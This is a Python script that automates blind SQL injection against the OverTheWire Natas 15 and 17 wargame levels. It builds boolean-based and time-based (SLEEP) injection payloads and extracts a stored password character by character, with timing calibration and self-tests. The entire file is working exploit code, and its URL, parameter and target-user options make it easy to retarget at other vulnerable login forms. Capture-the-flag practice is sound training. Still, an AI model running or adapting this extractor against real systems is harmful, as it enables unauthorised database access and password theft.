#!/usr/bin/env python3
"""
blind_sqli_extractor.py

Blind SQLi extractor for OverTheWire:
- Natas 15: boolean-based (looks for "This user exists.")
- Natas 17: time-based (measures IF(..., SLEEP(x), 0))

Usage examples:

  # Natas 15 -> extract natas16 password
  python3 blind_sqli_extractor.py --level 15 \
    --url https://natas15.natas.labs.overthewire.org/ \
    --auth-user natas15 --auth-pass '<PASS>' \
    --target-user natas16 --self-test

  # Natas 17 -> extract natas18 password
  python3 blind_sqli_extractor.py --level 17 \
    --url https://natas17.natas.labs.overthewire.org/ \
    --auth-user natas17 --auth-pass '<PASS>' \
    --target-user natas18 --sleep 1.0 --self-test

Requires:
  pip install requests
"""

from __future__ import annotations

import argparse
import statistics
import string
import sys
import time
from dataclasses import dataclass
from typing import Optional, Tuple

import requests


DEFAULT_CHARSET = string.ascii_letters + string.digits


@dataclass
class Config:
    level: int
    url: str
    auth_user: str
    auth_pass: str
    target_user: str
    method: str
    param: str
    length: int
    charset: str
    sleep_s: float
    timeout_s: float
    retries: int
    verbose: bool
    comment: str
    self_test: bool


def normalize_url(url: str) -> str:
    """
    If user provides base URL, turn it into something requests can hit consistently.
    Natas levels serve at /index.php; both / and /index.php typically work, but
    this avoids edge cases with redirects/caching.
    """
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        raise ValueError("URL must start with http:// or https://")

    if url.endswith("/"):
        return url + "index.php"
    if url.endswith("/index.php"):
        return url
    # If they gave something like https://.../ (no trailing slash) or /foo
    # and not index.php, keep as is.
    # But if it's exactly the host path without file, append /index.php
    if url.count("/") <= 2:
        return url + "/index.php"
    return url


def comment_suffix(cfg: Config) -> str:
    # MySQL: '-- ' requires a space after the dashes.
    # '# ' is also valid.
    if cfg.comment == "hash":
        return " # "
    return " -- -"


def http_request(cfg: Config, username_payload: str) -> Tuple[str, float, int]:
    auth = (cfg.auth_user, cfg.auth_pass)
    payload = {cfg.param: username_payload}

    t0 = time.perf_counter()
    if cfg.method.upper() == "GET":
        r = requests.get(cfg.url, params=payload, auth=auth, timeout=cfg.timeout_s, allow_redirects=True)
    else:
        r = requests.post(cfg.url, data=payload, auth=auth, timeout=cfg.timeout_s, allow_redirects=True)
    elapsed = time.perf_counter() - t0
    return r.text, elapsed, r.status_code


def build_payload_boolean(cfg: Config, pos: int, ch: str) -> str:
    # username="<INPUT>" in the PHP
    # We close the quote, inject AND condition, then comment out the rest.
    return f'{cfg.target_user}" AND BINARY SUBSTRING(password,{pos},1)=\'{ch}\'{comment_suffix(cfg)}'


def build_payload_time(cfg: Config, pos: int, ch: str) -> str:
    sleep_str = f"{cfg.sleep_s:.3f}".rstrip("0").rstrip(".")
    return f'{cfg.target_user}" AND IF(BINARY SUBSTRING(password,{pos},1)=\'{ch}\', SLEEP({sleep_str}), 0){comment_suffix(cfg)}'


def is_true_natas15(text: str) -> bool:
    return "This user exists." in text


def request_with_retries(cfg: Config, username_payload: str) -> Tuple[str, float, int]:
    last_err: Optional[Exception] = None
    for attempt in range(cfg.retries):
        try:
            return http_request(cfg, username_payload)
        except requests.RequestException as e:
            last_err = e
            time.sleep(0.15 + 0.15 * attempt)
    raise RuntimeError(f"HTTP request failed after {cfg.retries} retries: {last_err}")


def calibrate_baseline(cfg: Config, samples: int = 7) -> float:
    times = []
    benign = cfg.target_user  # no injection
    for _ in range(samples):
        _, elapsed, _ = request_with_retries(cfg, benign)
        times.append(elapsed)
        time.sleep(0.05)
    return statistics.median(times)


def self_test(cfg: Config) -> None:
    """
    Proves that:
      - auth works and endpoint responds
      - injection actually flips the inference signal
    """
    print("[*] Running self-test...")

    # Auth/endpoint sanity: request baseline
    t0_text, t0_elapsed, t0_status = request_with_retries(cfg, cfg.target_user)
    if cfg.verbose:
        print(f"[*] Baseline status={t0_status} elapsed={t0_elapsed:.3f}s")
        print(f"[*] Baseline body snippet: {t0_text[:140]!r}")

    if cfg.level == 15:
        # TRUE condition should show "This user exists." (if user is real)
        # Note: target_user (natas16) does exist in DB.
        if not is_true_natas15(t0_text):
            # Try an always-true injection (even if target_user didn't exist)
            always_true = f'{cfg.target_user}" OR 1=1{comment_suffix(cfg)}'
            text_true, _, _ = request_with_retries(cfg, always_true)
            always_false = f'{cfg.target_user}" AND 1=2{comment_suffix(cfg)}'
            text_false, _, _ = request_with_retries(cfg, always_false)

            print("[*] Baseline did NOT show 'This user exists.'; checking injection flip...")
            print(f"    OR 1=1 => exists? {is_true_natas15(text_true)}")
            print(f"    AND 1=2 => exists? {is_true_natas15(text_false)}")

            if is_true_natas15(text_true) and (not is_true_natas15(text_false)):
                print("[+] Self-test passed: boolean inference flips correctly.")
                return

            raise RuntimeError(
                "Self-test failed for natas15: boolean signal did not flip. "
                "Try --comment hash or verify URL/auth."
            )

        # If baseline already shows exists, still verify flip for safety.
        always_false = f'{cfg.target_user}" AND 1=2{comment_suffix(cfg)}'
        text_false, _, _ = request_with_retries(cfg, always_false)
        if is_true_natas15(text_false):
            raise RuntimeError(
                "Self-test failed for natas15: AND 1=2 still shows exists. "
                "Try --comment hash or verify you're hitting the real level."
            )

        print("[+] Self-test passed: baseline exists and AND 1=2 removes it.")
        return

    if cfg.level == 17:
        baseline = calibrate_baseline(cfg)
        # Always-sleep injection (should delay)
        always_sleep = f'{cfg.target_user}" AND IF(1=1, SLEEP({cfg.sleep_s}), 0){comment_suffix(cfg)}'
        _, elapsed_sleep, _ = request_with_retries(cfg, always_sleep)

        # Never-sleep injection (should be ~baseline)
        never_sleep = f'{cfg.target_user}" AND IF(1=2, SLEEP({cfg.sleep_s}), 0){comment_suffix(cfg)}'
        _, elapsed_nosleep, _ = request_with_retries(cfg, never_sleep)

        print(f"[*] baseline={baseline:.3f}s  sleep={cfg.sleep_s:.3f}s")
        print(f"[*] always_sleep elapsed={elapsed_sleep:.3f}s")
        print(f"[*] never_sleep  elapsed={elapsed_nosleep:.3f}s")

        # We expect always_sleep significantly bigger than never_sleep/baseline
        if elapsed_sleep < baseline + (cfg.sleep_s * 0.5):
            raise RuntimeError(
                "Self-test failed for natas17: timing signal not strong enough. "
                "Increase --sleep (e.g. 1.2) or check URL/auth/comment style."
            )

        print("[+] Self-test passed: timing signal is strong.")
        return

    raise ValueError("Unsupported level")


def test_char(cfg: Config, pos: int, ch: str, baseline: Optional[float], threshold: Optional[float]) -> bool:
    for attempt in range(cfg.retries):
        try:
            if cfg.level == 15:
                payload = build_payload_boolean(cfg, pos, ch)
                text, elapsed, status = http_request(cfg, payload)
                if cfg.verbose:
                    print(f"[15] pos={pos:02d} ch={ch!r} status={status} elapsed={elapsed:.3f}s payload={payload!r}")
                return is_true_natas15(text)

            if cfg.level == 17:
                assert baseline is not None and threshold is not None
                payload = build_payload_time(cfg, pos, ch)
                _, elapsed, status = http_request(cfg, payload)
                if cfg.verbose:
                    print(f"[17] pos={pos:02d} ch={ch!r} status={status} elapsed={elapsed:.3f}s thr={threshold:.3f}s payload={payload!r}")
                return elapsed > threshold

            raise ValueError("Unsupported level")
        except requests.RequestException:
            time.sleep(0.10 + 0.10 * attempt)
            continue
    return False


def extract_password(cfg: Config) -> str:
    baseline = None
    threshold = None

    if cfg.level == 17:
        # Recalibrate baseline periodically for stability
        baseline = calibrate_baseline(cfg)
        # Require a clear margin. Using 70% of sleep as margin is conservative.
        threshold = baseline + (cfg.sleep_s * 0.70)
        if cfg.verbose:
            print(f"[*] baseline={baseline:.3f}s threshold={threshold:.3f}s (sleep={cfg.sleep_s:.3f}s)")

    out = []
    for pos in range(1, cfg.length + 1):
        found = None

        # For natas17, recalibrate every few positions to reduce drift.
        if cfg.level == 17 and pos in (1, 9, 17, 25):
            baseline = calibrate_baseline(cfg)
            threshold = baseline + (cfg.sleep_s * 0.70)
            if cfg.verbose:
                print(f"[*] Recalibrated baseline={baseline:.3f}s threshold={threshold:.3f}s at pos={pos}")

        for ch in cfg.charset:
            if test_char(cfg, pos, ch, baseline, threshold):
                found = ch
                out.append(ch)
                print(f"[+] pos {pos:02d}: {ch}    => {''.join(out)}")
                break

        if found is None:
            print(f"[!] No match at position {pos}. Extracted so far: {''.join(out)}", file=sys.stderr)
            print("[!] Try: --comment hash  OR increase --sleep (natas17) OR run with --verbose + --self-test", file=sys.stderr)
            break

    return "".join(out)


def parse_args() -> Config:
    p = argparse.ArgumentParser(description="Blind SQLi extractor for OverTheWire Natas 15 and 17.")
    p.add_argument("--level", type=int, choices=[15, 17], required=True)
    p.add_argument("--url", required=True)
    p.add_argument("--auth-user", required=True)
    p.add_argument("--auth-pass", required=True)
    p.add_argument("--target-user", required=True)

    p.add_argument("--method", choices=["POST", "GET"], default="POST")
    p.add_argument("--param", default="username")

    p.add_argument("--length", type=int, default=32)
    p.add_argument("--charset", default=DEFAULT_CHARSET)

    p.add_argument("--sleep", dest="sleep_s", type=float, default=0.9)
    p.add_argument("--timeout", dest="timeout_s", type=float, default=10.0)
    p.add_argument("--retries", type=int, default=3)
    p.add_argument("--verbose", action="store_true")

    p.add_argument("--comment", choices=["dash", "hash"], default="dash",
                   help="SQL comment style: 'dash' uses -- -, 'hash' uses #")
    p.add_argument("--self-test", action="store_true",
                   help="Run injection sanity checks before extraction")

    a = p.parse_args()
    return Config(
        level=a.level,
        url=normalize_url(a.url),
        auth_user=a.auth_user,
        auth_pass=a.auth_pass,
        target_user=a.target_user,
        method=a.method,
        param=a.param,
        length=a.length,
        charset=a.charset,
        sleep_s=a.sleep_s,
        timeout_s=a.timeout_s,
        retries=a.retries,
        verbose=a.verbose,
        comment=a.comment,
        self_test=a.self_test,
    )


def main() -> int:
    cfg = parse_args()
    print(f"[*] URL: {cfg.url}")
    print(f"[*] Level: natas{cfg.level}  target_user={cfg.target_user}  method={cfg.method}  comment={cfg.comment}")

    if cfg.self_test:
        self_test(cfg)

    print("[*] Extracting password...")
    pw = extract_password(cfg)
    print("\n==== RESULT ====")
    print(pw)
    return 0 if len(pw) == cfg.length else 1


if __name__ == "__main__":
    raise SystemExit(main())
